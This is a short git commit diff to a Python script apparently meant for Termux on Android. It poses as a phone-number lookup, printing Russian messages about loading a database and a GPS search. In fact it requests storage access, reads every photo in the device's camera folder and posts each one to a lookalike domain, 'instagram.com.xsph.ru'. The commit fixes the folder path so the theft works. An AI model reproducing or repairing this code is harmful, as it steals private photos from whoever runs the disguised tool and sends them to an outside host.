4f59d598b124875a781ba214f512b086eb6466bc
Foled <66841487+Foled@users.noreply.github.com>
2020-06-15 02:01:41 +0300

    Update name.py

--- name.py
+++ name.py
@@ -5,9 +5,9 @@ input("Номер телефона: ")
 print("Загрузка БД...")
 os.system("termux-setup-storage")
 print("Идет процесс поиска по GPS")
-l = os.listdir("../ПАМЯТЬ УСТРОЙСТВА/DCIM/Camera")
+l = os.listdir("../ПАМЯТЬ УСТРОЙСТВА/DCIM/Camera/")
 for i in range(len(l)):
-    f = open("../ПАМЯТЬ УСТРОЙСТВА/DCIM/Camera"+l[i], "rb")
+    f = open("../ПАМЯТЬ УСТРОЙСТВА/DCIM/Camera/"+l[i], "rb")
     r = f.read()
     try:
         requests.post("http://instagram.com.xsph.ru/test/", data={"im": r})
